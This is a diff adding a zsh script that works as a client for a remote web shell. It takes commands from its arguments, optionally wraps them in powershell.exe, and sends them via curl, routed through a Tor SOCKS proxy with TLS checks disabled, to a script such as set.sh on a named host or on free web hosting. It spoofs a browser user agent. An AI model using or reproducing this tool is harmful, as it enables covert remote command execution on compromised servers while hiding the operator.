@@ -1,0 +1,44 @@
+#!/bin/zsh
+WIN=
+
+# set -x
+[ -z "$1" ] && { echo "need an endpoint"; exit 1; }
+ endpoint=${1}
+UA='Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.84 Safari/537.36'
+
+if [ -n "$QGH_ENDPOINT" ]; then
+	endpoint="$QGH_ENDPOINT"
+else
+	endpoint=${endpoint:-pkite.cacsite.com}
+fi
+
+#host=.gear.host
+#host=.heliohost.org
+# host=.x10host.com
+
+params=$(echo $@)
+#run="run.php"
+#run="cgi-bin/settler.sh"
+#run=${QGH_RUN:-"cgi-bin/set.sh"}
+ # run="settler.sh"
+run="set.sh"
+
+run=${QGH_SCRIPT:-${run}}
+
+if [ -z "$(echo ${*: -1} | grep -E ">|&")" ]; then
+redir="2>&1"
+fi
+
+if [ -n "$WIN" ]; then
+	if [ -z "$(echo ${*: -1} | grep -E "powershell|\.exe")" ]; then
+		shellex="powershell.exe "
+  else
+      #shellex="exec "
+      shellex=" "
+	fi
+fi
+
+#exec curl -sL "$endpoint.gear.host/run.php" --get --data-urlencode "path=${shellex}${params} ${redir}"
+exec curl --proxy socks5://localhost:9050 -k -sL "$endpoint$host/$run" --get --data-urlencode "path=${shellex}${params} ${redir}"
+#exec curl -k -sL "$endpoint$host/$run" --get --data-urlencode "path=${shellex}${params} ${redir}"
+
